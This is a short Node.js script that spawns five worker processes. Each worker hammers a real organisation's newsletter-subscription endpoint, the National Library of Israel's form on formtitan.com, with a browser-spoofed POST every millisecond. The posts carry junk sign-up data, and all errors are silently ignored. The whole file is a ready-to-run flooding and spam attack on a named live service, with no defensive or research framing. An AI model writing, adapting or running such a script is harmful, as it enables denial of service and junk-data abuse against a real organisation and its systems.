
const fetch = require('node-fetch')
const cluster = require('cluster');
const numCPUs = 100;
try{
if (cluster.isMaster) {
  // Fork workers based on the number of CPU cores or to a specified number (5 in this case)
  for (let i = 0; i < Math.min(5, numCPUs); i++) {
    cluster.fork();
  }

  cluster.on('online', (worker) => {

  });

  cluster.on('exit', (worker, code, signal) => {

  });
} else {
  setInterval(() => {
            fetch("https://nationallibraryofisrael.formtitan.com/webprojects/push/sfmapping", {
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.5",
            "cache-control": "no-cache",
            "content-type": "multipart/form-data; boundary=----WebKitFormBoundarysv4duUpizWlqaDaJ",
            "expires": "0",
            "fturl": "https://nationallibraryofisrael.formtitan.com/ftproject/nli_newsletters/sub_en",
            "pragma": "no-cache",
            "sec-ch-ua": "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Brave\";v=\"120\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Linux\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "sec-gpc": "1",
            "sfauthhash": "undefined"
        },
        "referrer": "https://nationallibraryofisrael.formtitan.com/ftproject/nli_newsletters/sub_en",
        "referrerPolicy": "unsafe-url",
        "body": "------WebKitFormBoundarysv4duUpizWlqaDaJ\r\nContent-Disposition: form-data; name=\"elemUID\"\r\n\r\ne362\r\n------WebKitFormBoundarysv4duUpizWlqaDaJ\r\nContent-Disposition: form-data; name=\"ruleUID\"\r\n\r\nundefined\r\n------WebKitFormBoundarysv4duUpizWlqaDaJ\r\nContent-Disposition: form-data; name=\"actionRuleId\"\r\n\r\n52c60fae-6ef2-48fe-a15b-fb0a1ab15237\r\n------WebKitFormBoundarysv4duUpizWlqaDaJ\r\nContent-Disposition: form-data; name=\"nodeId\"\r\n\r\n11ba09f0-75a1-45d6-8c70-dcb2f22bea09\r\n------WebKitFormBoundarysv4duUpizWlqaDaJ\r\nContent-Disposition: form-data; name=\"state\"\r\n\r\n{\"param##3b42582a-ac55-4b37-8ab3-e31fcb93c07b\":\"0037R00003Owh5EQAR\",\"prot_3b42582a-ac55-4b37-8ab3-e31fcb93c07b\":\"\",\"view:p356##p356:e361\":\"sadsadjkasj@gmail.com\",\"view:p356##p356:e359\":\"sadsadasd\",\"view:p356##p356:e360\":\"dsadwdxadasd\",\"view:p356##p356:e480\":\"213982321\"}\r\n------WebKitFormBoundarysv4duUpizWlqaDaJ\r\nContent-Disposition: form-data; name=\"list\"\r\n\r\n{\"52a8e0a2-01f7-4e10-a2a3-5a12ada48ded\":{}}\r\n------WebKitFormBoundarysv4duUpizWlqaDaJ\r\nContent-Disposition: form-data; name=\"clientY\"\r\n\r\n811\r\n------WebKitFormBoundarysv4duUpizWlqaDaJ--\r\n",
        "method": "POST",
        "mode": "cors",
        "credentials": "include"
        }).catch(err => {})
  },1)
}
}catch(err){}